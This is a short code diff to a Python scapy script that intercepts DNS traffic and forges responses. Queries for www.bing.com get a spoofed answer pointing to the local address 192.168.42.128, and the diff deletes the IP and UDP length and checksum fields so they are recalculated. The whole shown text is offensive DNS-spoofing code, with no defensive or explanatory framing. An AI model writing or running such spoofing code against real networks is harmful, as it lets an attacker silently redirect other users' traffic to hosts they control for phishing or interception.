@@ -13,6 +13,13 @@ def process_packet(packet):
         if "www.bing.com" in qname:
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdata="192.168.42.128")
+            scapyPacket[scapy.DNS].an = answer
+            scapyPacket[scapy.DNS].ancount = 1
+            
+            del scapyPacket[scapy.IP].len
+            del scapyPacket[scapy.IP].chksum
+            del scapyPacket[scapy.UDP].len
+            del scapyPacket[scapy.UDP].chksum
             
     packet.accept()
 
